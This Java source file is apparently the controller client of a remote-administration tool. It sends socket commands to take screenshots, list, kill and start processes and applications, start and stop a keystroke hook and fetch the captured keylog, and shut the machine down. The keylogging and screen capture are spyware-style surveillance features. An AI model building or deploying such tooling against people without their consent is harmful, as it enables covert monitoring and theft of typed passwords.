package socket;


import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

import javax.imageio.ImageIO;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;


@SuppressWarnings("unused")
public class Client {
	Socket socket ;
	PrintStream ps = null;
	BufferedReader br = null;
    InputStream inputstream= null;
	static String keylog = "";
	public final static int SERVER_PORT = 8888;
	
	
	
	public void connect(String SERVER_IP) throws InterruptedException
    {
		
        try 
        {
          
           socket = new Socket(SERVER_IP, SERVER_PORT);
            ps = new PrintStream(socket.getOutputStream());
            br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        }
        catch (UnknownHostException e)
        {
            e.printStackTrace();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        } catch (NumberFormatException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
	
	
	public void Screenshot() throws IOException
	{
		ps.println("1");

		
        FileOutputStream fout = new FileOutputStream("screen.jpg");
        int j;
       
        while (true)
        {
        	 
            String r = br.readLine();
        	j = Integer.parseInt(r);
            if(j <= -1)
            {
            	break;
            }
            fout.write(j);
        }

       
        fout.flush();
        fout.close();
		//=========================================================================================================
		
	
	}
	
	public void ListProcess() throws IOException
	{
		ps.println("2");
		
		
        int j;
        FileWriter fw = new FileWriter("process.txt");
        
        while (true)
        {
        	 
            String r = br.readLine();
            
            try{
            	j = Integer.parseInt(r);
            	if(j == -1)
                {
                	break;
                }
                
            }
            catch (NumberFormatException ex){
                
  
            }
   
            fw.write(r+ "\n");
           
        }

       
        
        fw.close();
       
	}
	

	public void KillProcess(String PID)
	{
		ps.println("3");
		
		ps.println(PID);
	}
	
	
	public void StartProcess(String NameProcess)
	{
		ps.println("4");
		
		NameProcess = NameProcess + ".exe"; 
		ps.println(NameProcess);
	}
	
	public void ListApp() throws IOException
	{
		ps.println("6");
		
		 int j;
         FileWriter fw = new FileWriter("applications.txt");
         
         while (true)
         {
         	 
             String r = br.readLine();
             
             try{
             	j = Integer.parseInt(r);
             	if(j == -1)
                 {
                 	break;
                 }
                 
             }
             catch (NumberFormatException ex){
                 
             }
    
             fw.write(r+ "\n");
            
         }
    
         fw.close();
        	
	}
	
	public void KillApp(String Aid)
	{
		// kill a app
		ps.println("7");
		ps.println(Aid);

	}
	
	public void StartApp(String NameApp)
	{
		// start a app
		ps.println("8");
		ps.println(NameApp);

	}
	

	public void Hook()
	{
		ps.println("10");
	}
	
	public void UnHook() throws IOException
	{
		ps.println("11");
		
	    keylog = br.readLine();
	   
	}

	
	public String ViewKeyStroker()
	{
		String temp = keylog;
		keylog = "";
		return temp;
	}
	
	public void Shutdown()
	{
		ps.println("12");
		// Shutting down the PC after 10 seconds.
	}
	
	public void ExitSocket()
	{
		ps.println("100");
		//thoat chuong trinh
	}
	
	
	
	
   
}
